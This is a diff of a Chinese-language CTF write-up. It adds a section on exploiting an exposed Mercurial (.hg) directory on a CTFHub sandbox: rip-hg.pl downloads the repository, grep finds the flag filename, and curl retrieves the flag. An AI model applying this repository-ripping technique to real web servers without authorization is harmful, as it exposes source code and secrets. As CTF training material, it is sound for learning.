@@ -1070,6 +1070,71 @@ entries  format  pristine  text-base  tmp  wc.db  wc.db-journal
 ctfhub{e99d45499cf367688c931aa2}
 ```
 
-提交`ctfhub{e99d45499cf367688c931aa2}`。
+提交`ctfhub{e99d45499cf367688c931aa2}`即可。
 
 ------
+
+#### HG泄露
+
+```bash
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ ./rip-hg.pl -u http://challenge-e37705d9e5375944.sandbox.ctfhub.com:10800/.hg
+[i] Getting correct 404 responses
+[i] Finished (2 of 12)
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ tree .hg
+.hg
+├── 00changelog.i
+├── dirstate
+├── last-message.txt
+├── requires
+├── store
+│   ├── 00changelog.i
+│   ├── 00manifest.i
+│   ├── data
+│   ├── fncache
+│   └── undo
+├── undo.branch
+├── undo.desc
+└── undo.dirstate
+
+3 directories, 11 files
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ cat .hg/last-message.txt                             
+add flag                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ grep -a -r flag                                  
+.git/hooks/fsmonitor-watchman.sample:           # return the fast "everything is dirty" flag to git and do the
+�O��L▒c.!flag_11i206259.index.htmlindex.htmlnormalfile$sha1$bf45c36a4dfb7337normaldir()infinity��å~%���Á�root�$�8�@3▒
+.svn/wc.db:�����2▒      flag_116206259.txt      index.html
+index.html6259.txt
+hg-decode.pl:      ( $head->{'flags'},
+.hg/last-message.txt:add flag
+.hg/dirstate:index.htmln��!d���flag_393953.txt
+.hg/store/00manifest.i:Yf��������H�tw������m'�Ȉ�*x�-�1�@�>�@)-<�▒M������x�1<�v�Ǣ�2K){�Z3�s�&ӱf▒A����?6[�B�
+                              6Ta�(��1$�Ü*YE������<W��ĩ���jV��⸉�8229flag_393953.txt7870e1473e78ed89644b65acab26c0f3e213f7a8
+.hg/store/undo:data/flag_393953.txt.i0
+.hg/store/fncache:data/flag_393953.txt.i
+.hg/undo.dirstate:index.htmla��������flag_393953.txt
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ curl http://challenge-e37705d9e5375944.sandbox.ctfhub.com:10800/flag_116206259.txt
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx/1.16.1</center>
+</body>
+</html>
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ curl http://challenge-e37705d9e5375944.sandbox.ctfhub.com:10800/flag_393953.txt
+ctfhub{f90b6c76f97124cd83e38e9b}
+```
+
+提交`ctfhub{f90b6c76f97124cd83e38e9b}`即可。
+
+------
+
